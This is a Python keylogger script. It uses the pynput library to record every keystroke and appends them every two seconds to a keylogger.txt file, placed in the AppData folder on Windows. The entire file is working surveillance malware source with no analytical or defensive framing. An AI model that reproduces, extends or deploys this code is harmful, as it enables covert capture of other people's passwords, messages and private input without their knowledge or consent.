#!/usr/bin/python
import pynput.keyboard
import threading
import os
import platform
import time

global path
global reporter


if platform.system() == "Linux":
	path = "keylogger.txt"
else:
	path = os.environ["appdata"] + "\\keylogger.txt"



class Reporter:
	def __init__(self):
		self._running = True
		self._keys = ""

	def stop(self):
		self._running = False

	def run(self):
        	while self._running:
        	        fin = open(path, "a")
        	        fin.write(self._keys)
        	        self._keys = ""
        	        fin.close()
        	        time.sleep(2)

	def process_key(self, key):
		try:
			self._keys += str(key.char)
		except AttributeError:
			if key == key.space:
				self._keys += " "
			elif key == key.shift:
				self._keys += ""
			elif key == key.enter:
				self._keys += "<]"
			elif key == key.right:
				self._keys += ""
			elif key == key.left:
				self._keys += ""
			elif key == key.up:
				self._keys += ""
			elif key == key.down:
				self._keys += ""
			else:
				self._keys += " " + str(key) + " "
		except UnicodeEncodeError:
			self._keys += " " + str(key)
		return self._running


def run():
	global reporter
	global keyboard_listener
	reporter = Reporter()
	keyboard_listener = pynput.keyboard.Listener(on_press=reporter.process_key)
	reporterThread = threading.Thread(target=reporter.run)
	reporterThread.start()
	keyboard_listener.start()

def stop():
	global reporter
	reporter.stop()



